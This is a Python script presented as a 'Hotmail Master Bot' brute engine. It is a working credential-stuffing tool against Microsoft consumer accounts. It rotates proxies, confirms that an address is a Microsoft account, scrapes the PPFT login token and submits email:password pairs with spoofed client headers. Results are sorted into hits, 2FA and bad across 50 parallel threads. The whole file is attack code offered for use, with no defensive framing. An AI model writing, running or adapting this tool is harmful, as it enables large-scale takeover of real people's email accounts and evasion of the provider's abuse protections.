#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Brute Engine - Hotmail Master Bot
Based on the working method from Hotmailbrute.py (hit.py style).
Returns: 'HIT', '2FA', 'BAD', or 'ERROR'
"""

import os
import re
import time
import uuid
import random
import logging
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional

logger = logging.getLogger(__name__)

# ==================== PROXY MANAGER (optional) ====================
class BruteProxyManager:
    def __init__(self, proxy_file=None):
        self.proxies = []
        self.lock = threading.Lock()
        if proxy_file and os.path.exists(proxy_file):
            self.load_proxies(proxy_file)

    def load_proxies(self, filepath):
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            for line in lines:
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) == 2:
                        proxy = {
                            'http': f'http://{parts[0]}:{parts[1]}',
                            'https': f'http://{parts[0]}:{parts[1]}'
                        }
                        self.proxies.append(proxy)
                    elif len(parts) == 4:
                        proxy = {
                            'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                            'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                        }
                        self.proxies.append(proxy)
        except Exception as e:
            logger.error(f"Error loading proxies: {e}")

    def get_random_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)

    def has_proxies(self):
        return len(self.proxies) > 0

# ==================== VALIDATOR (EXACT METHOD FROM HIT.PY) ====================
class BruteValidator:
    def __init__(self, proxy_manager=None, timeout=30):
        self.proxy_manager = proxy_manager
        self.timeout = timeout

    def _get_session(self):
        session = requests.Session()
        session.verify = False
        if self.proxy_manager and self.proxy_manager.has_proxies():
            proxy = self.proxy_manager.get_random_proxy()
            if proxy:
                session.proxies.update(proxy)
        return session

    def validate(self, email, password):
        """Check account using the exact method from Hotmailbrute.py / hit.py"""
        session = self._get_session()
        correlation_id = str(uuid.uuid4())

        try:
            # Step 1: Check email type
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive"
            }
            r1 = session.get(url1, headers=headers1, timeout=self.timeout)
            txt1 = r1.text

            if "Neither" in txt1 or "Both" in txt1 or "Placeholder" in txt1 or "OrgId" in txt1:
                return "BAD"
            if "MSAccount" not in txt1:
                return "BAD"

            time.sleep(0.3)

            # Step 2: Get PPFT token
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=self.timeout)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

            if not url_match or not ppft_match:
                return "BAD"

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            # Step 3: Submit login
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"

            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }

            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=self.timeout)
            response_text = r3.text.lower()

            # Check for errors
            if "account or password is incorrect" in response_text or r3.text.count("error") > 0:
                return "BAD"

            # Check for 2FA
            if "https://account.live.com/identity/confirm" in r3.text or "identity/confirm" in response_text:
                return "2FA"
            if "https://account.live.com/Consent" in r3.text or "consent" in response_text:
                return "2FA"

            # Check for abuse
            if "https://account.live.com/Abuse" in r3.text:
                return "BAD"

            # Check for valid login
            location = r3.headers.get("Location", "")
            if not location:
                return "BAD"

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return "BAD"

            return "HIT"

        except requests.exceptions.Timeout:
            return "ERROR"
        except requests.exceptions.ProxyError:
            return "ERROR"
        except requests.exceptions.ConnectionError:
            return "ERROR"
        except Exception as e:
            logger.debug(f"Validation error for {email}: {e}")
            return "ERROR"
        finally:
            session.close()

# ==================== ENGINE ====================
class BruteEngine:
    def __init__(self, proxy_file=None, timeout=30):
        self.proxy_manager = BruteProxyManager(proxy_file)
        self.timeout = timeout

    def validate_single(self, email, password):
        validator = BruteValidator(self.proxy_manager, timeout=self.timeout)
        return validator.validate(email, password)

    def validate_batch(self, combos, threads=50, include_2fa=True, progress_callback=None):
        results = {
            'hits': [],
            '2fa': [],
            'bad': 0,
            'errors': 0,
            'checked': 0
        }
        lock = threading.Lock()

        def worker(combo):
            try:
                email, pwd = combo.split(':', 1)
                email = email.strip()
                pwd = pwd.strip()
                validator = BruteValidator(self.proxy_manager, timeout=self.timeout)
                status = validator.validate(email, pwd)

                with lock:
                    results['checked'] += 1
                    if status == "HIT":
                        results['hits'].append(f"{email}:{pwd}")
                    elif status == "2FA":
                        if include_2fa:
                            results['2fa'].append(f"{email}:{pwd}")
                    elif status == "BAD":
                        results['bad'] += 1
                    else:
                        results['errors'] += 1

                    if progress_callback and results['checked'] % 10 == 0:
                        progress_callback(results['checked'])
            except Exception as e:
                logger.debug(f"Worker error: {e}")
                with lock:
                    results['errors'] += 1
                    results['checked'] += 1

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker, combo) for combo in combos]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Future error: {e}")

        return results